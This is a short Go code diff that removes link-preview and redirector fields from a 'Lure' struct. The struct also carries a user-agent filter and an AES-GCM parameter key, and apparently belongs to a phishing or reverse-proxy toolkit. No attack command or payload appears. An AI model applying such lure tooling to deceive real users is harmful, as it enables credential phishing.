@@ -31,11 +31,6 @@ type Lure struct {
 	UAFilter    string // raw regex; empty means accept all
 	uaFilter    *regexp.Regexp
 	PausedUntil time.Time
-	OGTitle     string
-	OGDesc      string
-	OGImage     string
-	OGURL       string
-	Redirector  string
 	ParamsKey   []byte // 32-byte AES-256-GCM key, generated at creation
 }
 
